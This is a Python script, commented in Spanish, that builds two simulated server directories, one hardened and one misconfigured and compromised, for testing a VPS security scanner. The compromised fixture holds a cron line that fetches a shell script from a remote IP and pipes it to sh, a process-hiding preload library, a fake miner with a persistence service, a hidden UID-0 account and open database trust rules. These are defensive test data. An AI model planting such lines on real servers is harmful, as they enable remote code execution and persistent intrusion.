#!/usr/bin/env python3
"""Crea dos servidores SIMULADOS para probar escanear_servidor.py sin un VPS real.

Uso: python3 crear_servidores.py CARPETA
Cada servidor es una carpeta con los archivos de configuración de un VPS (etc/, var/, tmp/)
y una subcarpeta _comandos/ con la salida que darían comandos como ss, ufw o docker ps.
Usa un disco que respete permisos (no exFAT/FAT), porque una prueba revisa permisos de archivos.
"""
import os
import shutil
import subprocess
import sys


def escribir(base, ruta, contenido, modo=None):
    destino = os.path.join(base, ruta.lstrip("/"))
    os.makedirs(os.path.dirname(destino), exist_ok=True)
    with open(destino, "wb" if isinstance(contenido, bytes) else "w") as f:
        f.write(contenido)
    if modo is not None:
        os.chmod(destino, modo)


def certificado(base, ruta, dias):
    destino = os.path.join(base, ruta.lstrip("/"))
    os.makedirs(os.path.dirname(destino), exist_ok=True)
    llave = destino + ".key"
    subprocess.run(["openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes", "-keyout", llave, "-out", destino,
                    "-days", str(dias), "-subj", "/CN=mitienda.com"], check=True, capture_output=True)
    os.remove(llave)


def servidor_vulnerable(base):
    shutil.rmtree(base, ignore_errors=True)
    c = "_comandos/"
    escribir(base, "/etc/os-release", 'PRETTY_NAME="Ubuntu 22.04.4 LTS"\nID=ubuntu\nVERSION_ID="22.04"\n')
    escribir(base, c + "ufw.txt", "Status: inactive\n")
    escribir(base, c + "ss.txt", "\n".join([
        'LISTEN 0 128 0.0.0.0:22 0.0.0.0:* users:(("sshd",pid=801,fd=3))',
        'LISTEN 0 511 0.0.0.0:80 0.0.0.0:* users:(("nginx",pid=900,fd=6))',
        'LISTEN 0 511 0.0.0.0:443 0.0.0.0:* users:(("nginx",pid=900,fd=7))',
        'LISTEN 0 244 0.0.0.0:5432 0.0.0.0:* users:(("postgres",pid=1200,fd=5))',
        'LISTEN 0 4096 0.0.0.0:6379 0.0.0.0:* users:(("docker-proxy",pid=1500,fd=4))',
        'LISTEN 0 4096 [::]:6379 [::]:* users:(("docker-proxy",pid=1501,fd=4))',
        'LISTEN 0 4096 0.0.0.0:5678 0.0.0.0:* users:(("docker-proxy",pid=1600,fd=4))',
        'LISTEN 0 4096 0.0.0.0:9443 0.0.0.0:* users:(("docker-proxy",pid=1700,fd=4))',
        'LISTEN 0 511 127.0.0.1:3000 0.0.0.0:* users:(("node",pid=2000,fd=20))',
    ]) + "\n")
    escribir(base, c + "docker_ps.txt", "\n".join([
        "redis\tredis:7\t0.0.0.0:6379->6379/tcp, :::6379->6379/tcp",
        "n8n\tn8nio/n8n:latest\t0.0.0.0:5678->5678/tcp",
        "portainer\tportainer/portainer-ce:latest\t0.0.0.0:9443->9443/tcp",
        "tienda\tmi-tienda:latest\t127.0.0.1:3000->3000/tcp",
    ]) + "\n")
    escribir(base, c + "docker_inspect.txt", "\n".join([
        "/redis\tfalse\t/var/lib/docker/volumes/redis/_data;",
        "/n8n\tfalse\t/home/ubuntu/.n8n;",
        "/portainer\ttrue\t/var/run/docker.sock;/var/lib/docker/volumes/portainer_data/_data;",
        "/tienda\tfalse\t/var/run/docker.sock;/var/www/tienda;",
    ]) + "\n")
    escribir(base, "/etc/ssh/sshd_config", "Include /etc/ssh/sshd_config.d/*.conf\nPort 22\nPermitRootLogin yes\n"
                                           "PasswordAuthentication yes\nUsePAM yes\n")
    escribir(base, c + "servicios.txt", "ssh.service loaded active running OpenBSD Secure Shell server\n"
                                        "nginx.service loaded active running nginx\n"
                                        "docker.service loaded active running Docker\n"
                                        "postgresql@14-main.service loaded active running PostgreSQL\n")
    escribir(base, c + "ssh_fallos.txt", "18342\n")
    escribir(base, "/root/.ssh/authorized_keys", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFAKEFAKEFAKE christian@macbook\n"
                                                 "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABFAKEFAKE freelancer-2023\n")
    escribir(base, c + "apt_check.txt", "37;24")
    escribir(base, "/var/run/reboot-required", "*** System restart required ***\n")
    escribir(base, "/etc/apt/apt.conf.d/10periodic", 'APT::Periodic::Update-Package-Lists "1";\n')
    escribir(base, "/etc/passwd", "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n"
                                  "ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash\nsysadm:x:0:0::/root:/bin/bash\n")
    escribir(base, "/etc/shadow", "root:$6$abc$FAKEHASH:19800:0:99999:7:::\nwww-data:*:19800:0:99999:7:::\n"
                                  "ubuntu::19800:0:99999:7:::\nsysadm:$6$x$FAKE:19800:0:99999:7:::\n")
    escribir(base, c + "ps.txt", "\n".join([
        "www-data                  4242 398.0 /tmp/.x/kdevtmpfsi",
        "root                      1  0.0 /sbin/init",
        "postgres                  1200  1.2 /usr/lib/postgresql/14/bin/postgres -D /var/lib/postgresql/14/main",
        "root                      900  0.1 nginx: master process /usr/sbin/nginx",
    ]) + "\n")
    escribir(base, "/tmp/.x/kdevtmpfsi", b"\x7fELF\x02\x01\x01FAKEBINARY", modo=0o755)
    escribir(base, "/tmp/notas.txt", "nada raro\n")
    escribir(base, "/etc/crontab", "SHELL=/bin/sh\n17 * * * * root cd / && run-parts --report /etc/cron.hourly\n")
    escribir(base, "/etc/cron.d/sync", "*/5 * * * * root curl -fsSL http://45.9.148.99/x.sh | sh\n")
    escribir(base, "/etc/ld.so.preload", "/usr/local/lib/libprocesshider.so\n")
    escribir(base, "/etc/systemd/system/dbus-update.service", "[Service]\nExecStart=/tmp/.x/kdevtmpfsi\nRestart=always\n")
    escribir(base, "/var/www/tienda/package.json", '{"name":"tienda","dependencies":{"next":"14.1.0"}}\n')
    escribir(base, "/var/www/tienda/.env", "STRIPE_SECRET_KEY=valor\nDATABASE_URL=postgres://u:p@localhost/db\n", modo=0o644)
    escribir(base, "/var/www/tienda/.git/HEAD", "ref: refs/heads/main\n")
    escribir(base, "/etc/nginx/nginx.conf", "user www-data;\nhttp { include /etc/nginx/sites-enabled/*; }\n")
    escribir(base, "/etc/nginx/sites-enabled/tienda", "server {\n  listen 80;\n  server_name mitienda.com;\n"
                                                     "  root /var/www/tienda;\n  location / { try_files $uri @app; }\n}\n")
    certificado(base, "/etc/letsencrypt/live/mitienda.com/cert.pem", 5)
    escribir(base, c + "df.txt", "Filesystem 1024-blocks Used Available Capacity Mounted on\n"
                                 "/dev/sda1 40000000 37200000 2800000 93% /\n")
    escribir(base, c + "timers.txt", "Mon 2026-10-06 00:00:00 UTC 10h left - - logrotate.timer logrotate.service\n")
    escribir(base, "/etc/postgresql/14/main/pg_hba.conf", "local   all   postgres   peer\n"
                                                          "host    all   all        0.0.0.0/0   trust\n")


def servidor_seguro(base):
    shutil.rmtree(base, ignore_errors=True)
    c = "_comandos/"
    escribir(base, "/etc/os-release", 'PRETTY_NAME="Ubuntu 24.04.1 LTS"\nID=ubuntu\nVERSION_ID="24.04"\n')
    escribir(base, c + "ufw.txt", "Status: active\n\nTo                         Action      From\n--                         ------      ----\n"
                                  "22/tcp                     LIMIT       Anywhere\n80/tcp                     ALLOW       Anywhere\n"
                                  "443/tcp                    ALLOW       Anywhere\n")
    escribir(base, c + "ss.txt", "\n".join([
        'LISTEN 0 128 0.0.0.0:22 0.0.0.0:* users:(("sshd",pid=801,fd=3))',
        'LISTEN 0 4096 0.0.0.0:80 0.0.0.0:* users:(("docker-proxy",pid=1500,fd=4))',
        'LISTEN 0 4096 0.0.0.0:443 0.0.0.0:* users:(("docker-proxy",pid=1501,fd=4))',
        'LISTEN 0 4096 127.0.0.1:5432 0.0.0.0:* users:(("docker-proxy",pid=1600,fd=4))',
        'LISTEN 0 4096 127.0.0.53%lo:53 0.0.0.0:* users:(("systemd-resolve",pid=500,fd=14))',
    ]) + "\n")
    escribir(base, c + "docker_ps.txt", "traefik\ttraefik:v3.1\t0.0.0.0:80->80/tcp, 0.0.0.0:443->443/tcp\n"
                                        "db\tpostgres:16\t127.0.0.1:5432->5432/tcp\ntienda\tmi-tienda:2.3\t3000/tcp\n")
    escribir(base, c + "docker_inspect.txt", "/traefik\tfalse\t/var/run/docker.sock;/opt/traefik/acme;\n"
                                             "/db\tfalse\t/var/lib/docker/volumes/pg/_data;\n/tienda\tfalse\t\n")
    escribir(base, "/etc/ssh/sshd_config.d/50-seguro.conf", "PasswordAuthentication no\nPermitRootLogin prohibit-password\n")
    escribir(base, "/etc/ssh/sshd_config", "Include /etc/ssh/sshd_config.d/*.conf\nPort 22\nKbdInteractiveAuthentication no\n")
    escribir(base, c + "servicios.txt", "ssh.service loaded active running OpenBSD Secure Shell server\n"
                                        "fail2ban.service loaded active running Fail2Ban Service\n"
                                        "docker.service loaded active running Docker\n")
    escribir(base, "/home/deploy/.ssh/authorized_keys", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFAKE christian@macbook\n")
    escribir(base, c + "apt_check.txt", "3;0")
    escribir(base, "/etc/apt/apt.conf.d/20auto-upgrades", 'APT::Periodic::Update-Package-Lists "1";\n'
                                                          'APT::Periodic::Unattended-Upgrade "1";\n')
    escribir(base, "/etc/passwd", "root:x:0:0:root:/root:/bin/bash\ndeploy:x:1000:1000::/home/deploy:/bin/bash\n")
    escribir(base, "/etc/shadow", "root:!:19800:0:99999:7:::\ndeploy:$6$abc$FAKEHASH:19800:0:99999:7:::\n")
    escribir(base, c + "ps.txt", "root                      1  0.0 /sbin/init\n"
                                 "999                       1300  2.0 postgres: checkpointer\n"
                                 "deploy                    2100  3.5 node /app/server.js\n")
    escribir(base, "/tmp/build.log", "ok\n")
    escribir(base, "/etc/crontab", "SHELL=/bin/sh\n17 * * * * root cd / && run-parts --report /etc/cron.hourly\n")
    escribir(base, "/etc/cron.d/backup", "0 3 * * * root docker exec db pg_dump -U app tienda | gzip > /backups/tienda.sql.gz\n")
    escribir(base, "/opt/tienda/package.json", '{"name":"tienda"}\n')
    escribir(base, "/opt/tienda/.env", "STRIPE_SECRET_KEY=valor\n", modo=0o600)
    escribir(base, "/etc/nginx/nginx.conf", "http {\n  server_tokens off;\n  server {\n    root /opt/tienda/public;\n"
                                            "    location ~ /\\. { deny all; }\n  }\n}\n")
    certificado(base, "/etc/letsencrypt/live/mitienda.com/cert.pem", 75)
    escribir(base, c + "df.txt", "Filesystem 1024-blocks Used Available Capacity Mounted on\n"
                                 "/dev/sda1 80000000 30000000 50000000 38% /\n")
    escribir(base, c + "timers.txt", "Mon 2026-10-06 00:00:00 UTC 10h left - - logrotate.timer logrotate.service\n")
    escribir(base, "/etc/postgresql/16/main/pg_hba.conf", "local   all   postgres   peer\n"
                                                          "host    tienda   app_tienda   127.0.0.1/32   scram-sha-256\n")


if __name__ == "__main__":
    destino = os.path.abspath(sys.argv[1])
    servidor_vulnerable(os.path.join(destino, "servidor-vulnerable"))
    servidor_seguro(os.path.join(destino, "servidor-seguro"))
    print("Servidores simulados creados en", destino)
